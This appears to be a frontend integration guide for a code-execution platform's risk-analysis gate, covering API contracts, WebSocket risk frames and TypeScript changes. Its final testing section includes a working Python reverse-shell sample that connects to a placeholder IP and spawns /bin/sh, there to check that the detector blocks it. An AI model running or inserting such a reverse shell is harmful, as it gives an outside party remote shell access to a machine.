# Frontend Integration Guide: Risk Analysis & Execution Gates

This guide provides full implementation details for the frontend engineer integrating the **Risk Analysis** module and updated execution endpoints (`POST /risk/analyze`, `POST /execute`, and `WS /ws/execute`).

---

## 1. Architectural Overview

The backend now enforces automated security and malware analysis before any code is allowed to execute in Docker.

```text
                                +--------------------+
                                |    Client Code     |
                                +---------+----------+
                                          |
                      +-------------------+-------------------+
                      |                                       |
             [On-Demand Analysis]                    [Execution Run]
                      |                                       |
                      v                                       v
             POST /risk/analyze                     WS /ws/execute or POST /execute
                      |                                       |
                      v                                       v
             Static + ML Analyzer                   Pre-Execution Risk Gate
                      |                                       |
                      |                           +-----------+-----------+
                      |                           |                       |
                      v                           v (decision="block")    v (allow / flag)
             Returns 200 Analysis           Socket Closes with Error   Spawns Sandbox Container
             (Always Safe to Render)        (HTTP 403 / WS "error")     Streams Output to User
```

There are two primary integration touchpoints on the frontend:
1. **The Risk Analysis Page (`/risk` / `RiskAnalysisPage.tsx`)**:
   - Calls `POST /risk/analyze` on-demand with Bearer authentication.
   - Replaces the mock regex scanner with full backend AST rules + ML model findings.
2. **The Execution Engine (`EditorPage.tsx` / `streamExecute.ts` / `useStreamExecution.ts`)**:
   - Handles the new `"risk"` informational frame emitted when code has warnings (`decision: "flag"`).
   - Handles the pre-execution block error frame when dangerous code is blocked (`reason: "blocked"`).

---

## 2. On-Demand Analysis: `POST /risk/analyze`

Used by the **Risk Analysis Page** when the user clicks **"Analyze"** on an active file.

### HTTP Contract
- **Method**: `POST`
- **Path**: `/risk/analyze`
- **Auth**: `Authorization: Bearer <token>`
- **Content-Type**: `application/json`

### Request Body
```json
{
  "language": "python",
  "code": "import socket\ns = socket.socket()\n"
}
```

| Field | Type | Required | Description |
|---|---|---|---|
| `language` | string | Yes | Target language identifier (`python`, `javascript`, `go`, `java`, `c`, `cpp`, `rust`). |
| `code` | string | Yes | Source code string to inspect (max 1,000,000 characters). |

### Success Response (`200 OK`)
> **Note**: Unlike execution endpoints, a `"block"` finding is a normal `200 OK` response here because the user asked to analyze the file, not run it.

```json
{
  "decision": "block",
  "score": 94.0,
  "thresholds": {
    "flag": 40,
    "block": 80
  },
  "findings": [
    {
      "rule_code": "py.net_fetch",
      "source": "rule",
      "category": "network",
      "severity": "low",
      "confidence": 0.1,
      "line_start": 3,
      "line_end": 3,
      "message": "Outbound HTTP request",
      "snippet": "urllib.request.urlopen('https://example.com', timeout=5)"
    },
    {
      "rule_code": "ml.python_classifier",
      "source": "ml",
      "category": "ml",
      "severity": "critical",
      "confidence": 0.942,
      "line_start": null,
      "line_end": null,
      "message": "Python classifier probability 0.94",
      "snippet": null
    }
  ],
  "model": "rules+ml",
  "ml_score": 94,
  "fallback_reason": null,
  "latency_ms": 3.84,
  "assessment_id": "a67fd998-1234-4567-89ab-cdef01234567",
  "error": null,
  "truncated": false,
  "reason": null
}
```

### Response Fields Breakdown

| Field | Type | Description |
|---|---|---|
| `decision` | `"allow" \| "flag" \| "block"` | High-level risk policy verdict based on `score` and `thresholds`. |
| `score` | number (0–100) | Composite risk score. Blends noisy-OR regex weights with ML classifier probability. |
| `thresholds` | `{ flag: number, block: number }` | Active decision thresholds (default: flag $\ge 40$, block $\ge 80$). |
| `findings` | `RiskFinding[]` | List of detected suspicious idioms and ML indicators. |
| `model` | `"rules" \| "rules+ml"` | Engine mode applied (`rules+ml` for Python with model; `rules` for other languages). |
| `latency_ms` | number | Analysis duration in milliseconds. |
| `truncated` | boolean | Set to `true` if input exceeded 400,000 characters (unscanned tail). |

### Finding Structure (`RiskFinding`)

| Field | Type | Nullable | Description |
|---|---|---|---|
| `rule_code` | string | No | Identifier (e.g., `"py.net_fetch"`, `"common.shadow"`, `"ml.python_classifier"`). |
| `source` | `"rule" \| "ml" \| "ast"` | No | Source of the finding. |
| `category` | string | No | Risk category: `"execution"`, `"destruction"`, `"credential_access"`, `"network"`, etc. |
| `severity` | `"critical" \| "high" \| "medium" \| "low"` | No | Severity level badge. |
| `confidence` | number | Yes | Rule weight or model probability (0.0 to 1.0). |
| `line_start` | integer | Yes | 1-based start line (null for file-level ML findings). |
| `line_end` | integer | Yes | 1-based end line. |
| `message` | string | No | Human-readable explanation of why this was flagged. |
| `snippet` | string | Yes | Code line excerpt where pattern was detected. |

### Error Responses
- **`400 Bad Request`**: Empty code or unsupported language.
- **`401 Unauthorized`**: Missing or expired Bearer token.
- **`503 Service Unavailable`**: Risk engine crashed internally and `RISK_FAIL_CLOSED=true` is enforced on the server.
  ```json
  {
    "status": "risk_unavailable",
    "risk": { "error": "risk_engine_error", "decision": "block", ... }
  }
  ```

---

## 3. Streaming Execution Updates: `WS /ws/execute`

When the user runs code in the editor, the WebSocket connection stream now includes risk notifications.

### Message Sequence
1. **Client sends initial payload**:
   ```json
   { "language": "python", "code": "...", "stdin": "" }
   ```
2. **Server evaluates risk before starting container**:
   - **Case A: `decision == "block"`** (Dangerous code):
     The server emits an error message and terminates the connection:
     ```json
     {
       "type": "error",
       "reason": "blocked",
       "message": "Execution blocked: score 94 exceeds block threshold 80",
       "risk": {
         "decision": "block",
         "score": 94,
         "findings": [ ... ]
       }
     }
     ```
     *No `stdout` or `result` frame will follow.*
   - **Case B: `decision == "flag"`** (Warning):
     The server emits an informational frame, then proceeds with execution:
     ```json
     {
       "type": "risk",
       "risk": {
         "decision": "flag",
         "score": 62,
         "findings": [ ... ]
       }
     }
     ```
     *Followed normally by `"stdout"`, `"stderr"`, and final `"result"` frames.*
   - **Case C: `decision == "allow"`**:
     Normal flow without extra frames.

---

## 4. REST Execution Updates: `POST /execute`

If calling the fallback synchronous endpoint `POST /execute`:

- **Allowed (`allow`)**: Returns 200 with standard `{ stdout, stderr, exit_code, status, execution_time }`.
- **Flagged (`flag`)**: Returns 200 with standard execution result plus a `"risk"` object attached:
  ```json
  {
    "stdout": "...",
    "stderr": "",
    "exit_code": 0,
    "status": "success",
    "execution_time": 0.42,
    "risk": { "decision": "flag", "score": 45, "findings": [ ... ] }
  }
  ```
- **Blocked (`block`)**: Returns **`403 Forbidden`** without executing code:
  ```json
  {
    "status": "blocked",
    "risk": {
      "decision": "block",
      "score": 90,
      "findings": [ ... ]
    }
  }
  ```

---

## 5. Frontend Implementation Tasks

### Step 1: Create `src/api/riskAnalysis.ts`
```typescript
import { apiClient } from './client';

export interface RiskFinding {
  rule_code: string;
  source: 'rule' | 'ml' | 'ast';
  category: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  confidence: number | null;
  line_start: number | null;
  line_end: number | null;
  message: string;
  snippet: string | null;
}

export interface RiskAnalysisResponse {
  decision: 'allow' | 'flag' | 'block';
  score: number;
  thresholds: { flag: number; block: number };
  findings: RiskFinding[];
  model: string;
  latency_ms: number;
  truncated: boolean;
  error?: string | null;
}

export async function analyzeCodeRisk(language: string, code: string): Promise<RiskAnalysisResponse> {
  const { data } = await apiClient.post<RiskAnalysisResponse>('/risk/analyze', { language, code });
  return data;
}
```

### Step 2: Update `src/api/streamExecution.ts`
Expand `StreamCallbacks` to handle the new risk events:

```typescript
export interface StreamCallbacks {
  onStdout?: (chunk: string) => void;
  onStderr?: (chunk: string) => void;
  onStdoutTruncated?: () => void;
  onStderrTruncated?: () => void;
  onResult?: (result: StreamResult) => void;
  onError?: (message: string, reason?: string, risk?: any) => void;
  onRiskWarning?: (risk: any) => void; // <--- NEW: for decision == "flag"
}
```
In `ws.onmessage`:
```typescript
if (msg.type === 'risk' && onRiskWarning) {
  onRiskWarning(msg.risk);
} else if (msg.type === 'error' && onError) {
  onError(msg.message, msg.reason, msg.risk);
}
```

### Step 3: Wire into `RiskAnalysisPage.tsx`
Replace the local regex `analyzeRiskHeuristic()` call with `analyzeCodeRisk()`:
1. Show a loading spinner during API request (`isAnalyzing`).
2. Display the overall score badge (e.g. `Score: 94 / 100`, badge color green for `allow`, amber for `flag`, red for `block`).
3. Render findings table with line numbers, severity pill, and description.

---

## 6. Testing & Sample Payloads

To test risk detection in the UI:

* **Benign (Expect Allow / Score < 40)**:
  ```python
  def fib(n):
      a, b = 0, 1
      for _ in range(n):
          a, b = b, a + b
      return a
  print(fib(10))
  ```

* **Suspicious Warning (Expect Flag / Score 40–79)**:
  ```python
  import os
  print(os.getenv("USER"))
  ```

* **Malicious (Expect Block / Score $\ge 80$)**:
  ```python
  import socket, os, pty
  s = socket.socket()
  s.connect(('1.2.3.4', 4444))
  os.dup2(s.fileno(), 0)
  pty.spawn('/bin/sh')
  ```

